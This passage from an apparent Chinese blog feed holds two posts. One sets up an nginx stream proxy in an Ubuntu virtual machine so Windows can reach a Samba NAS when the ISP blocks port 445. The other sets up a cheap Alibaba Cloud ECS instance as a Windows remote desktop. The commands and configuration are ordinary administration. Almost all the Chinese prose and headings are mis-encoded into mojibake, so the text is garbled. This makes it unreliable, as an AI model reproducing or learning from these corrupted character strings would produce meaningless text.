        <content type="text/html" src="https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/"><![CDATA[<h2 id="ËÉåÊôØ"><a href="#ËÉåÊôØ" class="headerlink" title="ËÉåÊôØ"></a>ËÉåÊôØ</h2><p>Ëø´‰∫é‰∏çËÉΩÊµ™Ë¥πÂÆøËàçËÅîÈÄöÂÆΩÂ∏¶ÁöÑÂÖ¨ÁΩë IPÔºåÊàëÁî®Ê†ëËéìÊ¥æÊê≠Âª∫‰∫Ü‰∏Ä‰∏™ NASÔºå‰ΩøÁî® Samba Êèê‰æõËÆøÈóÆ„ÄÇ‰ΩÜÊòØÔºåÁî±‰∫éËøêËê•ÂïÜÈôêÂà∂ÔºåÂÖ•Á´ôÂíåÂá∫Á´ôÁöÑ 139„ÄÅ445 Á´ØÂè£ÈÉΩË¢´Â∞ÅÁ¶ÅÔºàÂØπÔºÅ‰Ω†‰∏çËÉΩËÆøÈóÆÂÖ∂‰ªñÊú∫Âô®ÁöÑ 445 Á´ØÂè£ÔºÅÔºâÔºåËøôÊ†∑ÂÅöÂè™ËÉΩËÆ©Âêå‰∏Ä‰∏™Â±ÄÂüüÁΩëÁöÑÊúçÂä°ËÆøÈóÆ„ÄÇÊàëÂ∞ùËØï‰øÆÊîπ‰∫ÜÁ´ØÂè£Âè∑ÔºåÊääÊú¨Âú∞ÁöÑ 445 Á´ØÂè£Êò†Â∞ÑÂà∞ÂÖ¨ÁΩëÁöÑÂÖ∂ÂÆÉÁ´ØÂè£ÔºåÁÆóÊòØÂèØ‰ª•ÁªôÂ§ßÈÉ®ÂàÜ Samba ÂÆ¢Êà∑Á´Ø‰ΩøÁî®‰∫ÜÔºàÊØîÂ¶ÇÂÆâÂçìÊâãÊú∫Ôºâ„ÄÇ‰ΩÜÊòØÔºåWindows ÁöÑ Samba ÂÆ¢Êà∑Á´ØÔºåÂπ∂‰∏çÊîØÊåÅËÆæÁΩÆÁ´ØÂè£Âè∑ÔºàÂ¶ÇÊûúÂú®Êñá‰ª∂ÁÆ°ÁêÜÂô®Âú∞ÂùÄÊ†èËæìÂÖ• <code>\\a.b.c.d:xxx</code> Â∞Ü‰ºöË¢´ËÆ§‰∏∫ÊòØ WebDAV ÂçèËÆÆÔºâ„ÄÇ</p><p>ÁΩë‰∏äÊüê‰∫õÊïôÁ®ãËØ¥ÔºåÂú® Windows Êú¨Âú∞ËÆæÁΩÆÁ´ØÂè£ËΩ¨ÂèëÔºåÊääËÆøÈóÆÊú¨Êú∫ 445 Á´ØÂè£ÁöÑÊµÅÈáèËΩ¨ÂèëËá≥‰Ω†ÁöÑ Samba ÊúçÂä°Âô®Á´ØÂè£„ÄÇ‰ΩÜÊòØÔºåËøôÊ†∑ÂÅöÈúÄË¶ÅÂÖ≥Èó≠ Windows Ëá™Â∑±ÁöÑ Samba ÊúçÂä°Âô®Ôºå‰ºöÂØºËá¥ÁΩëÁªúÂÖ±‰∫´„ÄÅÁΩëÁªúÊâìÂç∞Êú∫Á≠âÂæàÂ§öÂäüËÉΩÊó†Ê≥ï‰ΩøÁî®ÔºåÂØºËá¥Ëé´ÂêçÂÖ∂Â¶ôÁöÑÈóÆÈ¢òÔºåÊâÄ‰ª•‰∏çÊé®Ëçê„ÄÇ</p><p>‰ΩÜÊòØÂèØ‰ª•Êç¢‰∏™ÊÄùË∑Ø„ÄÇ</p><h2 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h2><p>Êó¢ÁÑ∂‰∏çËÉΩ‰ΩøÁî®Êú¨Êú∫Ôºà127.0.0.1ÔºâÂÅöËΩ¨ÂèëÔºåÈÇ£‰πà‰∏∫‰ªÄ‰πà‰∏ç‰ΩøÁî®Êú¨Âú∞ÁΩëÁªú‰∏≠ÂÖ∂‰ªñÁöÑÊú∫Âô®ËøõË°åÊï∞ÊçÆËΩ¨ÂèëÂë¢Ôºü‰∏ÄÂºÄÂßãÊàëÊÉ≥Âú®Êú¨Âú∞ÁΩëÁªú‰∏≠Âä†‰∏Ä‰∏™Ê†ëËéìÊ¥æ‰πãÁ±ªÁöÑÂ∞è‰∏ªÊú∫Ôºå‰ΩÜËßâÂæóËøôÊ†∑Â§™Á¥ØËµò‰∫Ü„ÄÇËôöÊãüÊú∫‰πüÊòØÁã¨Á´ãÁöÑÊú∫Âô®ÔºåÊàëËßâÂæó‰∏ÄÊ†∑ÊúâÊïà„ÄÇ</p><p>ÊâÄ‰ª•ÔºåÂè™Ë¶ÅÂú®ËôöÊãüÊú∫ÈáåÈù¢Ë£Ö‰∏Ä‰∏™ÂèçÂêë‰ª£ÁêÜÂ∫îÁî®ÔºàNginxÔºâÔºåÊääÂèëÂæÄËôöÊãüÊú∫ 445 Á´ØÂè£ÁöÑÊµÅÈáèËΩ¨ÂèëÂà∞ Samba ÊúçÂä°Âô®ÔºåÁÑ∂Âêé‰ΩøÁî® Windows Samba ÂÆ¢Êà∑Á´ØËÆøÈóÆËøô‰∏™ËôöÊãüÊú∫ÔºåÂ∞±Á≠â‰∫éËÆøÈóÆ Samba ÊúçÂä°Âô®„ÄÇ</p><h2 id="ÂÆûË∑µ"><a href="#ÂÆûË∑µ" class="headerlink" title="ÂÆûË∑µ"></a>ÂÆûË∑µ</h2><p>ËøôÈáåÔºåÊàë‰ΩøÁî®‰∫Ü Windows Hyper VÔºåÂàõÂª∫‰∫Ü Ubuntu 20.04 Server ËôöÊãüÊú∫ÔºàÁõ¥Êé•‰∏ãËΩΩÂÆòÊñπ ISOÔºâÔºåÁÑ∂Âêé‰ΩøÁî®ÈªòËÆ§‰∫§Êç¢Êú∫‰Ωú‰∏∫ËôöÊãüÊú∫ÁöÑÁΩëÁªú„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2020/04/28/2416a9e0b66ec.png" alt="Snipaste_2020-04-28_14-07-57.png" style="zoom:33%;"></p><p>ÂêØÂä®ÂêéÔºåÂÆâË£ÖÁ≥ªÁªüÔºåÁÑ∂ÂêéÈô§‰∫ÜÊõ¥Êñ∞ÈïúÂÉèÊ∫ê„ÄÅÂÆâË£Ö NginxÔºå‰ªÄ‰πàÈÉΩ‰∏çÁî®ÂÅö„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure><p>Ë£ÖÂ•Ω Nginx ÂêéÔºå‰øÆÊîπÈÖçÁΩÆÊñá‰ª∂Ôºö</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>Ê∑ªÂä†‰∏Ä‰∏™ stream Ê®°ÂùóÔºåÂ§ßËá¥ÂÉè‰∏ãÈù¢Ôºö</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">stream</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">445</span>;</span><br><span class="line">        </span><br><span class="line">        // ‰Ω†ÁöÑ NAS Âú∞ÂùÄ</span><br><span class="line">        <span class="attribute">proxy_pass</span> mynas.example.com:<span class="number">12345</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÈáçÂêØ NginxÔºö</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><p>ËΩ¨ÂèëÁöÑÊ®°ÂùóÂ∞±ÂÅöÂ•Ω‰∫Ü„ÄÇ</p><p>ÁÑ∂ÂêéÔºåÂÜçÂú® Windows ‰∏≠ÊâìÂºÄ <code>\\&lt;ËôöÊãüÊú∫ÁöÑip&gt;\&lt;samba Ë∑ØÂæÑÔºàÂèØÈÄâÔºâ&gt;</code> Â∞±ÂÆåÊàê‰∫Ü„ÄÇËôöÊãüÊú∫ ip ÂèØ‰ª•Âú®ËôöÊãüÊú∫ÈáåÈù¢Áî® ifconfig ÂëΩ‰ª§Êü•Áúã„ÄÇ</p><h2 id="ÂêéÁª≠"><a href="#ÂêéÁª≠" class="headerlink" title="ÂêéÁª≠"></a>ÂêéÁª≠</h2><p>‰πüËÆ∏ÂèØ‰ª•Áî® docker ÂÆûÁé∞Ôºå‰ΩÜÊàëËøòÊ≤°ÊÉ≥Â•ΩÊÄé‰πàÊêû„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/</id>
        <title><![CDATA[‰ΩøÁî®ÈòøÈáå‰∫ë ECS Êê≠Âª∫Âªâ‰ª∑ÁöÑÈ´òÊÄßËÉΩ‰∫ëÊ°åÈù¢]]></title>
        <updated>2020-04-28T05:26:07+08:00</updated>
        <link href="https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/02/08/build-powerful-remote-desktops-with-aliyun-ECS-at-low-price/"><![CDATA[<blockquote><p>Ë¶ÅÊÉ≥ËØªÊáÇÊú¨ÊñáÔºå‰Ω†ÈúÄË¶ÅÔºö</p><ol><li>‰∫ÜËß£ÈòøÈáå‰∫ëÁ≠â‰∫ëÊúçÂä°ÁöÑÂü∫Êú¨ WEB ÁïåÈù¢Êìç‰ΩúÔºõ</li><li>‰∫ÜËß£ Windows Êìç‰ΩúÁ≥ªÁªüÁöÑ‰∏≠Èò∂Êìç‰ΩúÔºõ</li><li>‰∫ÜËß£Âü∫Á°ÄÁöÑËΩØ‰ª∂ÂºÄÂèëÊúØËØ≠„ÄÇ</li></ol></blockquote><h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>Êú¨ÊñáÈù¢ÂêëÁöÑÊòØÈúÄË¶Å‰ΩøÁî®È´òÊÄßËÉΩËÆ°ÁÆóËÆæÂ§áÔºå‰ΩÜÊòØË∫´ËæπÂè™Êúâ‰ΩéÊÄßËÉΩPCÊú∫ÁöÑÁæ§‰Ωì„ÄÇÊúÄËøëÁî±‰∫é NCP Áñ´ÊÉÖÔºåÂá∫‰∏ç‰∫ÜÈó®ÔºåËøîÂõû‰∏ç‰∫ÜÂ∑•‰ΩúÂú∞ÔºåÊÉ≥ÂøÖ‰∏çÂ∞ë‰∫∫ÁöÑÈ´òÊÄßËÉΩËÆ°ÁÆóËÆæÂ§áÔºàÂ•ΩÁîµËÑëÔºâÊ≤°Â∏¶ÂõûÂÆ∂Ôºå‰ΩÜÊòØÔºåËÇØÂÆö‰πüÊúâ‰∫∫Ë∑üÊàë‰∏ÄÊ†∑ÔºåÂèó‰∏ç‰∫ÜÁ¨îËÆ∞Êú¨ÁîµËÑëÁöÑÈæüÈÄü„ÄÇ</p><p>ÊàëÁöÑÈÖçÁΩÆÈúÄÊ±ÇÊòØÔºåËÉΩÂ§üÊµÅÁïÖËøêË°åÂÆâË£ÖÂ§ö‰∏™Êèí‰ª∂ÁöÑ VSCode„ÄÅËÉΩÂ§üÂêåÊó∂ÊâìÂºÄÊï∞ÂçÅ‰∏™ Firefox Ê†áÁ≠æÈ°µ„ÄÅËÉΩÂ§üÂø´ÈÄüÂÆåÊàê node È°πÁõÆÊûÑÂª∫„ÄÇ‰ΩÜÊòØÊàëË∫´ËæπÂè™Êúâ‰∏ÄÂè∞‰∫îÂπ¥ÂâçÁöÑ intel NUC (i3-4010U, 4GB RAM)„ÄÇ</p><p>Âú®ËØ¶ÁªÜ‰∫ÜËß£‰∫ÜÂêÑÂ§ß‰∫ëÊúçÂä°ÂïÜÁöÑ‰∫ëËÆ°ÁÆóÂπ≥Âè∞ÂêéÔºå‰∏™‰∫∫ÊéíÈô§‰∫ÜÂçé‰∏∫‰∫ëÔºàÂºπÊÄßËÆ°ÁÆóÊúçÂä°‰ª∑Ê†ºËæÉÈ´ò„ÄÅ‰∫ëÊ°åÈù¢ÂîÆÁΩÑÔºâ„ÄÅËÖæËÆØ‰∫ëÔºà‰∫ëËÆ°ÁÆóÊúçÂä°Á±ªÂà´ËøáÂ∞ëÔºâ„ÄÅÂ§©Áøº‰∫ëÔºà‰∫ëÊ°åÈù¢ÈúÄË¶ÅÂÆâË£ÖÊåáÂÆö APP ‰∏îÊÄßËÉΩ‰∏çÊª°Ë∂≥Ë¶ÅÊ±ÇÔºâÔºåÂÜ≥ÂÆö‰ΩøÁî®ÈòøÈáå‰∫ëÁöÑ‰∫ëËÆ°ÁÆóÊúçÂä°„ÄÇ</p><h2 id="‰ΩøÁî®ÈòøÈáå‰∫ëÂàùÊ≠•Êê≠Âª∫‰∫ëÊ°åÈù¢"><a href="#‰ΩøÁî®ÈòøÈáå‰∫ëÂàùÊ≠•Êê≠Âª∫‰∫ëÊ°åÈù¢" class="headerlink" title="‰ΩøÁî®ÈòøÈáå‰∫ëÂàùÊ≠•Êê≠Âª∫‰∫ëÊ°åÈù¢"></a>‰ΩøÁî®ÈòøÈáå‰∫ëÂàùÊ≠•Êê≠Âª∫‰∫ëÊ°åÈù¢</h2><p>ÁªèËøáÊùÉË°°ÔºåÊàëÂÜ≥ÂÆö‰ΩøÁî®ÈòøÈáå‰∫ë ESC ‚ÄúÊä¢Âç†ÂºèÂÆû‰æã‚Äù‰ªòË¥πÊ®°Âºè‰∏ãÁöÑ‚ÄúÁ™ÅÂèëÊÄßËÉΩÂÆû‰æã‚Äù„ÄÇ‰∏∫‰ªÄ‰πàËøô‰πàÈÄâÔºü</p><p>Âõ†‰∏∫Ê≤°Èí±‚Ä¶‚Ä¶</p><p>ÂºÄÁé©Á¨ëÁöÑ„ÄÇÊàëËßâÂæóËøôÊòØÊàëÈúÄÊ±Ç‰∏ãÁöÑÂêàÁêÜÈÄâÊã©ÊñπÂºè„ÄÇ‰∏∫‰ªÄ‰πàÈÄâÊã©‚ÄúÊä¢Âç†ÂºèÂÆû‰æã‚ÄùÔºüÈ¶ñÂÖàÔºåÊàë‰ª¨Â§çÂ∑•ÁöÑÊó∂Èó¥ËøòÊòØ‰∏™Êú™Áü•Êï∞ÔºåËÄå‰∏îÂèØËÉΩÈöèÊó∂Â∞±‰∏çÊÉ≥Áî®Ëøô‰∏™‰∫ëÊ°åÈù¢‰∫Ü„ÄÇ‚ÄúÊä¢Âç†ÂºèÂÆû‰æã‚ÄùÊòØÊåâÈáè‰ªòË¥πÁöÑ‰∏ÄÁßçÔºå‰πüÂ∞±ÊòØÔºåÁî®Â§öÈïøÊó∂Èó¥ÁªôÂ§öÂ∞ëÈí±„ÄÇÂπ∂‰∏îÔºåÁõ∏ÂØπ‰∫éÊåâÈáè‰ªòË¥πÔºåÊúâÁõ∏ÂΩìÂ§ßÁöÑÊäòÊâ£„ÄÇ<strong>‚ÄúÊä¢Âç†ÂºèÂÆû‰æã‚ÄùÁöÑÊúÄÂ§ßÈóÆÈ¢òÂú®‰∫éÔºåËøôÊòØÁ´û‰ª∑Ê®°Âºè„ÄÇ‰πüÂ∞±ÊòØËØ¥ÔºåÂΩìÂà´‰∫∫Âá∫‰ª∑ÊØî‰Ω†È´òÁöÑÊó∂ÂÄôÔºåÊàñËÄÖÈòøÈáå‰∫ë‰æõÁªôÁ¥ßÂº†ËÄå‰Ω†ÂèàÁªôÈí±ÁªôÂæó‰∏çÂ§üÁöÑÊó∂ÂÄôÔºåÂÆÉ‰ºöËá™Âä®Â∏Æ‰Ω†ÈáäÊîæ„ÄÇÊàë‰∫ÜËß£ÁöÑÊòØÔºåÂú®ÈáäÊîæÂâç5ÂàÜÈíüÔºåÈòøÈáå‰∫ë‰ºöÊúâÊèêÈÜí„ÄÇ</strong>‰∏∫‰∫ÜÂ∞ΩÈáèÈÅøÂÖçÂÆû‰æãË¢´Ëá™Âä®ÈáäÊîæÔºåÊàëÈÄâÊã©‰∫Ü‚Äú‰ΩøÁî®Ëá™Âä®Âá∫‰ª∑‚ÄùÔºå‰πüÂ∞±ÊòØËØ¥ÔºåÁ≥ªÁªü‰ºöÊØèÂ∞èÊó∂Ëá™Âä®Âà§Êñ≠ÂΩìÂâçÊó∂Èó¥ËØ•ÂÆû‰æãÁöÑ‰ª∑Ê†ºÔºåÂπ∂ÈÄâÊã©‰∏Ä‰∏™È´ò‰∫éÂ∏ÇÂú∫Âùá‰ª∑ÁöÑ‰ª∑Ê†ºËøõË°å‰ªòË¥π„ÄÇ<strong>‰ΩÜÊòØÔºåËøôÂπ∂‰∏çÊòØ‰∏áÊó†‰∏ÄÂ§±ÔºåÈòøÈáå‰∫ëÂú®‰æõÁªôÁ¥ßÂº†ÁöÑÊó∂ÂÄôÔºå‰ªçÁÑ∂‰ºöÂ∞ÜÂÆû‰æãÈáäÊîæ„ÄÇ</strong>ÊâÄ‰ª•ÔºåÂú®Â§ÑÁêÜÈáçË¶ÅÊï∞ÊçÆÊó∂ÔºåÂ∫îËØ•ÈöèÊó∂Â§á‰ªΩ„ÄÇÊàëÁöÑÂ§ÑÁêÜÊñπÊ≥ïÊòØÔºåÈöèÊó∂Â∞Ü‰ª£Á†ÅÊèê‰∫§Âà∞ÊàëÁöÑ Git ‰ªìÂ∫ì„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2020/02/09/ea3d50f39b198.png" alt="Snipaste_2020-02-09_17-32-20.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/df1fabf212984.png" alt="Snipaste_2020-02-09_17-34-24.png"></p><p>Â¶ÇÊûúË¶Å‰øùËØÅ‰∏ç‰ºöË¢´ÈáäÊîæÔºåÂª∫ËÆÆ‰ΩøÁî®ÂåÖÂπ¥ÂåÖÊúàÂà∂„ÄÇ</p><p>‰∏∫‰ªÄ‰πà‰ΩøÁî®‚ÄúÁ™ÅÂèëÊÄßËÉΩÂÆû‰æã‚ÄùÔºüÂõ†‰∏∫‰∏™‰∫∫ÁîµËÑë‰∏éÊúçÂä°Âô®‰∏çÂêå„ÄÇ‰∏™‰∫∫ÁîµËÑë‰∏ç‰ºöÊó∂Êó∂ÂàªÂàªÂç†Áî®Â§ßÈáè CPUÔºåCPU‰ΩøÁî®ÁéáÊòØÁ¶ªÊï£ÂåñÁöÑÔºåÊâÄ‰ª• CPU ÁöÑ‰ΩøÁî®ÁßØÂàÜÔºåÊàëËßâÂæóÊòØÁî®‰∏çÂÆåÔºå25% ÁöÑ‰ΩøÁî®Âü∫Á∫øÔºåÂÆåÂÖ®Â§üÁî®„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2020/02/09/d74c0622ec620.png" alt="Snipaste_2020-02-09_17-34-05.png"></p><p>ÂìéÔºåÁõÆÂâçÂ•ΩÂÉèÂõΩÂÜÖ‰πüÂè™ÊúâÈòøÈáå‰∫ëËÉΩÂÅöÂá∫‚ÄúÊä¢Âç†ÂºèÂÆû‰æã‚ÄùÂíå‚ÄúÁ™ÅÂèëÊÄßËÉΩÂÆû‰æã‚Äù„ÄÇ</p><p>ÂÖ∂‰ªñÁöÑÈÖçÁΩÆÂ∞±ÁÆÄÂçï‰∫ÜÔºåÂå∫ÂüüÈÄâÊã©Èù†Ëøë‰Ω†ÁöÑÔºà‰∏çÂêåÂú∞Âå∫ÁöÑ‰ª∑Ê†ºÂ•ΩÂÉèÂ∑ÆÂà´Êå∫Â§ßÔºâÔºåÈïúÂÉèÈÄâÊã© Windows ServerÔºåÂè¶Â§ñÔºåSSD ÊòØÂæàÂÖ≥ÈîÆÁöÑÔºåÊàëËßâÂæóÁé∞Âú®Â∑≤ÁªèÊ≤°ÊúâÂ§öÂ∞ë‰∫∫ËÉΩÂøçÂèóÊú∫Ê¢∞Á°¨ÁõòÁöÑÈæüÈÄü‰∫Ü„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2020/02/09/6ae75caa75c6a.png" alt="Snipaste_2020-02-09_18-03-26.png"></p><p><img src="https://img.vvzero.com/ih/2020/02/09/cbe75edc3c797.png" alt="Snipaste_2020-02-09_17-36-25.png"></p><p>Âú®‰∏ã‰∏Ä‰∏™È°µÈù¢ÈÖçÁΩÆÁΩëÁªúÔºå‰∏∫‰∫Ü‰øùËØÅËøúÁ®ãÊ°åÈù¢ÊµÅÁïÖÔºåÊåâ‰ΩøÁî®ÊµÅÈáèËÆ°Ë¥πÔºåÂ∏¶ÂÆΩÊãâÊª°ÔºÅ</p><p><img src="https://img.vvzero.com/ih/2020/02/09/2c112190ea447.png" alt="Snipaste_2020-02-09_17-45-57.png"></p><p>ÊúÄÁªàÔºåÊàëÁöÑÈÖçÁΩÆÂ¶Ç‰∏ãÔºö</p><ul><li>4Ê†∏16GBÔºå25% Âπ≥ÂùáCPU ËÆ°ÁÆóÊÄßËÉΩÔºõ</li><li>100Mbps ÊåâÊµÅÈáè‰ªòË¥πÁΩëÁªúÔºõ</li><li>80GB SSDÔºõ</li><li>Windows Server 2019 Êï∞ÊçÆ‰∏≠ÂøÉÁâàÔºõ</li></ul><p>ËøôÊ†∑ÁöÑËØùÔºåÂÆû‰æã‰ª∑Ê†º‰∏∫ 0.412 ÂÖÉÊØèÂ∞èÊó∂ÔºàÊàëÈÄâÁöÑÊòØ‰∏äÊµ∑Âå∫ÁöÑÔºåÂÖ∂‰ªñÂå∫ÁöÑÂèØËÉΩÊõ¥‰æøÂÆúÔºåÂú®Ê∑±Â§ú„ÄÅÊó©‰∏ä‰πü‰ºöÊõ¥‰æøÂÆúÔºâÔºåÊµÅÈáèË¥πÁî®‰∏∫ 0.8 ÂÖÉÊØè GB„ÄÇÁÆó‰∏ÄÁÆóÔºå‰∏ÄÂ§©Â§ßÊ¶ÇË¶Å 10 ÂÖÉÔºå‰∏Ä‰∏™ÊúàÂ§ßÊ¶ÇË¶Å 300 ÂÖÉÔºåÊòØ‰∏çÊòØËøòÊòØÊúâÁÇπË¥µÔºüÊ≤°ÂÖ≥Á≥ªÔºåÁªßÁª≠Áúã„ÄÇ</p><p><img src="https://img.vvzero.com/ih/2020/02/09/ecfef72872df3.png" alt="Snipaste_2020-02-09_17-36-50.png"></p><h2 id="‰ª∑Ê†ºÁöÑËøõ‰∏ÄÊ≠•‰ºòÂåñ"><a href="#‰ª∑Ê†ºÁöÑËøõ‰∏ÄÊ≠•‰ºòÂåñ" class="headerlink" title="‰ª∑Ê†ºÁöÑËøõ‰∏ÄÊ≠•‰ºòÂåñ"></a>‰ª∑Ê†ºÁöÑËøõ‰∏ÄÊ≠•‰ºòÂåñ</h2><p>Áé∞Âú®ÊàëÂ∑≤ÁªèÂêØÂä®‰∫ÜËøô‰∏™ÂÆû‰æãÔºö</p><p><img src="https://img.vvzero.com/ih/2020/02/09/3ea24c1929367.png" alt="Snipaste_2020-02-09_18-21-04.png"></p><p>ÊàëËøòÊÉ≥Êõ¥‰æøÂÆú„ÄÇ</p><h3 id="‰∏éÂü∫ÂèãÂêàÁßü‰∏ÄÂè∞Êú∫Âô®"><a href="#‰∏éÂü∫ÂèãÂêàÁßü‰∏ÄÂè∞Êú∫Âô®" class="headerlink" title="‰∏éÂü∫ÂèãÂêàÁßü‰∏ÄÂè∞Êú∫Âô®"></a>‰∏éÂü∫ÂèãÂêàÁßü‰∏ÄÂè∞Êú∫Âô®</h3><p>ÊàëÊÉ≥‰Ω†‰∏ÄÂÆö‰∏çÂèØËÉΩ‰∏ÄÂ§©24Â∞èÊó∂ÈÉΩÂú®Áî®ÂÆÉÔºåÁî®ÂÆÉÁöÑÊó∂ÂÄô‰πü‰∏ÄÂÆö‰∏ç‰ºö‰∏ÄÁõ¥Âç†Êª° CPU„ÄÇÂÖ≥ÈîÆÊòØÔºåÊàë‰ª¨ËøôÊòØ Windows ServerÔºåË∑üÂÆ∂Â∫≠Áâà„ÄÅ‰∏ì‰∏öÁâà„ÄÅ‰ºÅ‰∏öÁâà‰ªÄ‰πàÁöÑÈÉΩ‰∏ç‰∏ÄÊ†∑ÔºåÂÆÉÊîØÊåÅÂ§ö‰∏™Áî®Êà∑ÂêåÊó∂ÁôªÈôÜÔºÅÊâÄ‰ª•ÔºåÊàëËßâÂæóÔºåÂ¶ÇÊûúÊúâ‰ø°‰ªªÁöÑ‰∫∫ÈÄâÔºåÂÆåÂÖ®ÂèØ‰ª•ÂêàÁßü„ÄÇ</p><h3 id="ÂÖ≥Êú∫Êó∂ÈÄâÊã©‚ÄúÂÅúÊú∫‰∏çËÆ°Ë¥π‚Äù"><a href="#ÂÖ≥Êú∫Êó∂ÈÄâÊã©‚ÄúÂÅúÊú∫‰∏çËÆ°Ë¥π‚Äù" class="headerlink" title="ÂÖ≥Êú∫Êó∂ÈÄâÊã©‚ÄúÂÅúÊú∫‰∏çËÆ°Ë¥π‚Äù"></a>ÂÖ≥Êú∫Êó∂ÈÄâÊã©‚ÄúÂÅúÊú∫‰∏çËÆ°Ë¥π‚Äù</h3><p>ÈòøÈáå‰∫ëÁúüÁöÑÊòØÁ•ûÂ•áÁöÑÂ≠òÂú®ÔºåÂú® ECS ÁÆ°ÁêÜÁïåÈù¢ÔºåÈÄâÊã©ÂÅúÊú∫ÔºåÁ´üÁÑ∂ÂèØ‰ª•ÂÅúÊú∫‰∏çÊî∂Ë¥πÔºÅ</p><p><img src="https://img.vvzero.com/ih/2020/02/09/28437c5fae934.png" alt="ÂõæÁâá1.png"></p><p>ÂÆûÈôÖ‰∏ä‰πü‰∏çÊòØÂÆåÂÖ®‰∏çÊî∂Ë¥πÔºåÁ°¨ÁõòÂíåÂºπÊÄßÂÖ¨ÁΩë IP ‰ªçÁÑ∂ÊòØÊî∂Ë¥πÁöÑ„ÄÇ‰ΩÜÊòØÔºå‰∏éÂÅúÊú∫Âêé‰ªçÁÑ∂‰øùÁïôCPU„ÄÅÂÜÖÂ≠òÁõ∏ÊØîÔºå‰ª∑Ê†ºÂ§ßÂπÖÈôç‰Ωé„ÄÇ‰πüÂ∞±ÊòØËØ¥ÔºåÊàë‰ª¨Âú®ÊØèÂ§©Êôö‰∏äÔºåÂÆåÂÖ®ÂèØ‰ª•ÂÖ≥Êú∫Âπ∂ÈÄâÊã©‰∏çÊî∂Ë¥πÔºåÂèØ‰ª•ËäÇÁ∫¶‰∏ÄÂ§ßÁ¨î„ÄÇÂ¶ÇÊûúÊÉ≥Ë¶Å‰∏ÄÁõ¥‰ΩøÁî®Âêå‰∏Ä‰∏™ IPÔºåÂèØ‰ª•ÈÄâÊã©ÁªëÂÆöÂºπÊÄßÂÖ¨ÁΩë IP„ÄÇ</p><h3 id="‰æùÊçÆ‰∏™‰∫∫ÈúÄÊ±ÇÈÄâÊã©ÂÆû‰æãËßÑÊ†º"><a href="#‰æùÊçÆ‰∏™‰∫∫ÈúÄÊ±ÇÈÄâÊã©ÂÆû‰æãËßÑÊ†º" class="headerlink" title="‰æùÊçÆ‰∏™‰∫∫ÈúÄÊ±ÇÈÄâÊã©ÂÆû‰æãËßÑÊ†º"></a>‰æùÊçÆ‰∏™‰∫∫ÈúÄÊ±ÇÈÄâÊã©ÂÆû‰æãËßÑÊ†º</h3><p>ÊàëËßâÂæóÔºåÂèØËÉΩ 8GB ÂÜÖÂ≠òÂ∑≤ÁªèÂ§üÊàëÁî®‰∫ÜÔºåÂè¶Â§ñÔºåÈùíÂ≤õÂå∫ÁöÑÂÆû‰æãÂ•ΩÂÉèÊØèÂ∞èÊó∂ËÉΩÊõ¥‰æøÂÆú‰∏ÄÊØõÈí±‚Ä¶‚Ä¶</p><h2 id="‰∫ëÊ°åÈù¢‰ΩìÈ™å"><a href="#‰∫ëÊ°åÈù¢‰ΩìÈ™å" class="headerlink" title="‰∫ëÊ°åÈù¢‰ΩìÈ™å"></a>‰∫ëÊ°åÈù¢‰ΩìÈ™å</h2><p>Âú®‰ΩìÈ™å‰πãÂâçÔºåÂÜçÁ°Æ‰øù‰∏Ä‰∏ãÔºöËØ•ÂÆû‰æãÁΩëÁªúÂÆâÂÖ®ÁªÑÔºåÈúÄË¶ÅÊîæÈÄö 3389 Á´ØÂè£ÔºàTCP Âíå UDP ÈÉΩË¶ÅÊîæÈÄöÔºâ„ÄÇ</p><p>ÊâìÂºÄÊú¨Âú∞ÁöÑËøúÁ®ãÊ°åÈù¢ÂÆ¢Êà∑Á´ØËØïËØïÂêßÔºÅ</p><p><img src="https://img.vvzero.com/ih/2020/02/09/b4629c62b4373.png" alt="Snipaste_2020-02-09_18-38-25.png"></p><p>ÁΩëÁªúÊñπÈù¢ÔºåÊàëÊòØÊ±üËãèÁîµ‰ø°ÁΩëÁªúÔºåËøûÊé•‰∏äÊµ∑Âå∫ÁöÑ 